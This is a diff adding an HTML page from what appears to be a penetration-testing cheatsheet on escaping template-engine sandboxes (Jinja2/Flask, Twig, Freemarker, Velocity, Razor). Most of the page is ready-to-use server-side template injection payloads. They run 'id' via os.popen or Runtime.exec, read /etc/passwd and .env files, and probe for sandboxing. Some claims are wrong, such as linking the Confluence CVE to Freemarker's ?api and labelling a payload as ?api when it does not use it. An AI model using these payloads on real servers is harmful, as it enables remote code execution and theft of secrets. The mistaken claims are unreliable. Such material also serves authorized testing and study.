@@ -1,0 +1,150 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Sandbox escape · ArxOS cheatsheets</title><link rel="stylesheet" href="../../../../../codex.css"></head>
+<body><header class="cx-top"><a class="cx-brand" href="../../../../../index.html">ArxOS</a><span class="cx-sub">Cheatsheets</span>
+<a class="cx-search-link" href="../../../../../index.html#search">Search</a></header>
+<main class="cx-main"><nav class="cx-crumbs"><a href="../../../../../index.html">Cheatsheets</a> › Web › Server-Side</nav><h1>Sandbox escape</h1><p class="cx-lede">Escaping restricted template execution environments - Flask SandboxedEnvironment, Twig sandbox mode, Freemarker secure_uberspect, Velocity secure_uberspect.</p><div class="cx-tags"><span class="cx-tag">MITRE T1190, T1027</span><span class="cx-tag">D3FEND D3-EAL, D3-PE</span><span class="cx-tag">IMPACT ServerSideEval, RCE</span></div><article class="cx-body"><h2 id="tldr">TL;DR</h2>
+<p>A template sandbox restricts what built-in helpers, attributes, and methods the engine exposes. Escape paths:</p>
+<ul>
+<li><strong>Jinja2 sandbox</strong> - string indexing instead of <code>__class__</code> attribute, <code>request.args</code> smuggle, <code>lipsum.__globals__</code> removed by Flask's SandboxedEnvironment but not by all subclasses</li>
+<li><strong>Twig sandbox</strong> - <code>filter</code>/<code>map</code>/<code>sort</code> callbacks with PHP function names, source/include with traversal</li>
+<li><strong>Freemarker</strong> - <code>?api</code> mechanism (added 2.3.22) bypasses <code>new_builtin_class_resolver</code> restrictions</li>
+<li><strong>Velocity</strong> - Velocity Tools <code>$class</code> survives some <code>secure_uberspect</code> configs; reflection through static fields when method access is restricted</li>
+</ul>
+<p>The general principle: sandboxes filter by name. Reach the same object through a different name (string indexing, reflection, namespace tricks) and the sandbox often doesn't see it.</p>
+<h2 id="what-a-sandbox-actually-blocks">What a sandbox actually blocks</h2>
+<p>Sandboxes typically restrict three categories:</p>
+<ol>
+<li><strong>Attribute access</strong> - <code>__class__</code>, <code>__mro__</code>, <code>getClass</code>, <code>class</code>, similar magic attributes that walk the runtime type system</li>
+<li><strong>Function names</strong> - <code>eval</code>, <code>exec</code>, <code>system</code>, <code>popen</code>, <code>Runtime.exec</code>, similar direct command-execution APIs</li>
+<li><strong>Module imports</strong> - <code>__import__</code>, <code>require</code>, <code>Type.GetType</code>, similar loaders</li>
+</ol>
+<p>Each engine implements these checks differently. None implement them completely. The bypasses below exploit the difference between "filtered name" and "reachable object."</p>
+<h2 id="jinja2-sandboxedenvironment">Jinja2 - SandboxedEnvironment</h2>
+<p>Flask's <code>SandboxedEnvironment</code> (and Jinja2's directly) blocks attribute access to names starting with <code>__</code>:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>{{ &#x27;&#x27;.__class__ }}                           # blocked: &quot;access to the attribute &#x27;__class__&#x27; of &#x27;str&#x27; object is unsafe&quot;</code></pre></figure>
+<h3 id="path-a-string-indexing-instead-of-attribute-access">Path A - String indexing instead of attribute access</h3>
+<p>The sandbox checks <code>__getattr__</code>. String indexing (<code>__getitem__</code>) is a different code path:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>{{ &#x27;&#x27;[&#x27;__class__&#x27;] }}                        # often works where &#x27;&#x27;.__class__ is blocked
+{{ &#x27;&#x27;[&#x27;__class__&#x27;][&#x27;__mro__&#x27;][1][&#x27;__subclasses__&#x27;]() }}</code></pre></figure>
+<p>Some sandbox subclasses also filter <code>__getitem__</code> - test the simpler <code>''['__class__']</code> first.</p>
+<h3 id="path-b-requestargs-smuggle">Path B - <code>request.args</code> smuggle</h3>
+<p>When the sandbox blocks the string literal <code>__class__</code> but allows attribute reads from <code>request</code>:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>{{ &#x27;&#x27;[request.args.x][request.args.y][1][request.args.z]() }}</code></pre></figure>
+<p>Then send the request with <code>?x=__class__&amp;y=__mro__&amp;z=__subclasses__</code>. The keyword <code>__class__</code> never appears in the template body - it arrives via the query string.</p>
+<h3 id="path-c-attr-filter">Path C - <code>attr</code> filter</h3>
+<p>Jinja2's built-in <code>attr</code> filter is sometimes allowed when direct attribute access is blocked:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>{{ &#x27;&#x27;|attr(&#x27;__class__&#x27;) }}
+{{ &#x27;&#x27;|attr(&#x27;__class__&#x27;)|attr(&#x27;__mro__&#x27;) }}</code></pre></figure>
+<h3 id="path-d-cycler-joiner-namespace-flask-specific">Path D - <code>cycler</code> / <code>joiner</code> / <code>namespace</code> (Flask-specific)</h3>
+<p>Flask exposes these helpers globally in templates. Their <code>__globals__</code> reaches <code>os</code> regardless of sandboxing on <code>__class__</code>:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>{{ cycler.__init__.__globals__.os.popen(&#x27;id&#x27;).read() }}
+{{ joiner.__init__.__globals__.os.popen(&#x27;id&#x27;).read() }}
+{{ namespace.__init__.__globals__.os.popen(&#x27;id&#x27;).read() }}</code></pre></figure>
+<p>If sandbox filters <code>__init__</code> specifically, try <code>__globals__</code> directly:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>{{ cycler.__globals__.os.popen(&#x27;id&#x27;).read() }}</code></pre></figure>
+<h3 id="path-e-range-dict-other-built-in-callables">Path E - <code>range</code>, <code>dict</code>, other built-in callables</h3>
+<p>When most paths are blocked but Jinja2's built-in <code>range</code> is still callable:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>{{ range.__globals__.os.popen(&#x27;id&#x27;).read() }}</code></pre></figure>
+<p>Built-in callables like <code>range</code>, <code>dict</code>, <code>lipsum</code> have <code>__globals__</code> pointing into Jinja2's runtime module - which often has <code>os</code> imported for path manipulation.</p>
+<h2 id="twig-sandbox-mode">Twig - Sandbox mode</h2>
+<p>Twig's sandbox restricts:</p>
+<ul>
+<li>Tags (<code>if</code>, <code>for</code> allowed by default; <code>set</code>, <code>extends</code>, <code>include</code> filtered)</li>
+<li>Filters (<code>escape</code>, <code>length</code> allowed; <code>filter</code>, <code>map</code>, <code>reduce</code> NOT in default allowlist but often added)</li>
+<li>Functions (<code>max</code>, <code>min</code> allowed; almost nothing else by default)</li>
+<li>Methods on objects (none by default; allowlist per object class)</li>
+</ul>
+<h3 id="path-a-filter-map-callbacks">Path A - <code>filter</code> / <code>map</code> callbacks</h3>
+<p>If the sandbox allowlist includes the <code>filter</code> or <code>map</code> filters (commonly added because they're useful), PHP function names work as callables:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>{{[&#x27;id&#x27;]|filter(&#x27;system&#x27;)}}
+{{[&#x27;id&#x27;]|map(&#x27;system&#x27;)|join(&#x27;,&#x27;)}}
+{{[&#x27;/etc/passwd&#x27;]|map(&#x27;file_get_contents&#x27;)|join(&#x27;&#x27;)}}</code></pre></figure>
+<p>The string <code>'system'</code> passes through the sandbox because it's a string, not a method call.</p>
+<h3 id="path-b-source-and-include">Path B - <code>source</code> and <code>include</code></h3>
+<p>If <code>source</code> is allowed (it often is - sandboxes use it for partials):</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>{{ source(&#x27;../config/services.yaml&#x27;) }}
+{{ source(&#x27;../.env&#x27;) }}</code></pre></figure>
+<p>Path traversal here is loader-relative. Most Twig loaders are pinned to the templates directory; traversal escapes that to wherever the loader's root resolves.</p>
+<h3 id="path-c-_selfenv-reachability">Path C - <code>_self.env</code> reachability</h3>
+<p>In hardened Twig, <code>_self.env</code> returns null or throws. In some sandbox subclasses, <code>_self.env</code> exists but specific methods are filtered:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>{{_self.env.getRuntimeLoader()}}             # often allowed
+{{_self.env.getLoader().getSourceContext(&#x27;foo&#x27;).getCode()}}</code></pre></figure>
+<p>The <code>getSourceContext</code> path reads template files directly, bypassing the application's view-resolution logic.</p>
+<h2 id="freemarker-new_builtin_class_resolver-restrictions">Freemarker - <code>new_builtin_class_resolver</code> restrictions</h2>
+<p>Freemarker's sandbox restricts which classes <code>?new</code> can instantiate. When <code>new_builtin_class_resolver</code> is set to <code>TemplateClassResolver.ALLOWS_NOTHING_RESOLVER</code>, <code>?new</code> is disabled.</p>
+<h3 id="path-a-api-reflection-freemarker-2322">Path A - <code>?api</code> reflection (Freemarker 2.3.22+)</h3>
+<p>The <code>?api</code> built-in exposes the Java API of any TemplateModel - bypassing <code>?new</code> restrictions entirely:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>${&quot;&quot;.getClass().forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;exec&quot;,[&quot;&quot;.getClass()]).invoke(null,&quot;id&quot;)}</code></pre></figure>
+<p>This is the path CVE-2022-26134 (Confluence) used. The Freemarker sandbox didn't anticipate reflection through <code>?api</code> on objects already in scope.</p>
+<h3 id="path-b-available-built-ins">Path B - Available built-ins</h3>
+<p>Some Freemarker built-ins survive sandboxing and provide indirect file access:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>${.now}                                      # current time - confirms eval
+${.template_name}                            # template path - info disclosure
+${.locale}                                   # server locale
+${.data_model?keys}                          # variable names in scope</code></pre></figure>
+<p><code>?.data_model?keys</code> reveals what application objects are available - frequently includes a <code>request</code>, <code>session</code>, or <code>app</code> object whose methods can be called via <code>?api</code>.</p>
+<h2 id="velocity-secure_uberspect">Velocity - <code>secure_uberspect</code></h2>
+<p>Velocity's <code>secure_uberspect</code> setting restricts reflection methods (<code>getClass</code>, <code>getMethod</code>, <code>invoke</code>). It's the closest analog to a true sandbox in Velocity.</p>
+<h3 id="path-a-velocity-tools-class">Path A - Velocity Tools <code>$class</code></h3>
+<p><code>$class.inspect(...)</code> uses a different code path than direct reflection - frequently survives <code>secure_uberspect</code>:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>$class.inspect(&quot;java.lang.Runtime&quot;).type.getMethod(&quot;getRuntime&quot;).invoke(null).exec(&quot;id&quot;)</code></pre></figure>
+<p>If Velocity Tools is loaded but reflection is blocked elsewhere, this is often the path.</p>
+<h3 id="path-b-static-fields">Path B - Static fields</h3>
+<p>When method access is blocked, static field access sometimes isn't:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>#set($s=&quot;&quot;)
+#set($cls=$s.getClass().getSuperclass())     # often still works</code></pre></figure>
+<p>The exact bypass depends on which methods <code>secure_uberspect</code> filters. Test individual reflection methods (<code>getClass</code>, <code>getSuperclass</code>, <code>getMethod</code>, <code>invoke</code>) - sandbox configurations frequently filter only the obvious ones.</p>
+<h2 id="erb-no-sandbox">ERB - no sandbox</h2>
+<p>ERB does not implement a sandbox. Ruby applications wanting templated user input typically switch to <strong>Liquid</strong> (Shopify's restricted templating language) - which is genuinely sandboxed and very hard to escape. If you're hitting Liquid:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>{{7 | times: 7}}                             # → 49 in Liquid</code></pre></figure>
+<p>Liquid's filter syntax (<code>{{ x | filter }}</code>) is distinctive. RCE through Liquid is exceptionally difficult; most engagements stop at information disclosure (filter abuse to read template-context variables).</p>
+<h2 id="razor-no-sandbox-by-default">Razor - no sandbox by default</h2>
+<p>Razor compiles to C# and runs with full BCL access. There is no built-in sandbox mode in either RazorEngine or RazorLight. Some applications implement custom sandboxes by analyzing the generated C# AST and rejecting forbidden namespaces - these are usually defeated by reflection:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>@{ var t = System.Type.GetType(&quot;System.Diagnostics.Process&quot;); /* ... */ }</code></pre></figure>
+<p>The string <code>"System.Diagnostics.Process"</code> is data, not a namespace reference - AST-based filters often miss it.</p>
+<h2 id="cross-engine-principles">Cross-engine principles</h2>
+<p>The bypasses above share three principles:</p>
+<ol>
+<li><strong>Reach the object through data, not code.</strong> <code>__class__</code>, <code>system</code>, <code>Runtime</code> as literal strings in <code>request.args</code> / <code>attr()</code> / <code>forName()</code> survive filters that block them as keywords.</li>
+<li><strong>Use the engine's most convenient API.</strong> <code>_self.env</code> (Twig), <code>?api</code> (Freemarker), <code>$class</code> (Velocity Tools), <code>cycler.__globals__</code> (Flask) - engine-provided escape hatches are usually less filtered than the obvious reflection paths.</li>
+<li><strong>Look for <em>un</em>restricted callables.</strong> Filters that look harmless (<code>filter</code>, <code>map</code>, <code>attr</code>) become arbitrary function call when their callback parameter is reached.</li>
+</ol>
+<h2 id="detection-am-i-in-a-sandbox">Detection - am I in a sandbox?</h2>
+<p>Quick probes to identify sandbox presence:</p>
+<div class="cx-tabs">
+<div class="cx-tab">
+<p class="cx-tab-label">Jinja2</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>{{ &#x27;&#x27;.__class__ }}                           # blocked → sandboxed
+{{ config }}                                 # empty → likely sandboxed (Flask normally exposes config)
+{{ &#x27;&#x27;[&#x27;__class__&#x27;] }}                        # works where &#x27;&#x27;.__class__ doesn&#x27;t → SandboxedEnvironment-style</code></pre></figure>
+</div>
+<div class="cx-tab">
+<p class="cx-tab-label">Twig</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>{{_self.env}}                                # null/error → sandboxed
+{{[1]|filter(&#x27;var_dump&#x27;)}}                   # works → filter callback escape available
+{{ source(&#x27;does_not_exist&#x27;) }}               # error message reveals whether source is allowlisted</code></pre></figure>
+</div>
+<div class="cx-tab">
+<p class="cx-tab-label">Freemarker</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>${&quot;freemarker.template.utility.Execute&quot;?new()}   # error → ?new restricted
+${.now?api}                                  # works → ?api available (escape path open)</code></pre></figure>
+</div>
+<div class="cx-tab">
+<p class="cx-tab-label">Velocity</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>$s.getClass()                                # null/error → secure_uberspect on
+$class                                       # works → Velocity Tools loaded (likely path)</code></pre></figure>
+</div>
+</div>
+<div class="cx-aside cx-tip">
+<p class="cx-aside-title">Tip</p>
+<p>The most reliable single signal of sandbox presence: arithmetic works (<code>{{7*7}}</code> → <code>49</code>) but the engine-specific class-access probe fails. Arithmetic doesn't require reflection; the class probes do. If <code>7*7</code> evaluates and <code>''.__class__</code> doesn't, you're sandboxed.</p>
+</div>
+<h2 id="notes">Notes</h2>
+<ul>
+<li><strong>Sandbox version matters.</strong> Each engine has tightened sandboxing over time. Jinja2's SandboxedEnvironment was significantly hardened in 2.10 (April 2019). Twig's sandbox got the <code>_self</code> filter in 1.32 (March 2017). Freemarker's <code>?api</code> filter restrictions arrived in 2.3.27 (March 2018). Older deployments are far more exploitable.</li>
+<li><strong>Custom sandbox subclasses.</strong> Applications sometimes subclass the built-in sandboxes to add/remove restrictions. These customizations frequently introduce new gaps - the application's developers add a "useful" filter or expose a "safe" helper that the sandbox authors never considered.</li>
+<li><strong>Sandbox != security boundary.</strong> Template sandboxes are designed to prevent accidents in semi-trusted templates (a marketing user editing email copy), not to resist motivated attackers. Treat any successful template injection in a sandboxed engine as still potentially exploitable - give it five payloads from this page before concluding the sandbox is solid.</li>
+</ul></article><nav class="cx-pager"><a class="cx-prev" href="../tornado/index.html">Previous: Tornado (Python - Tornado web framework)</a><a class="cx-next" href="../filter-bypass/index.html">Next: Filter bypass</a></nav></main>
+<footer class="cx-foot"><p>For authorized testing and study only. <a href="../../../../../license.html">License</a></p></footer>
+<script src="../../../../../codex.js"></script></body></html>
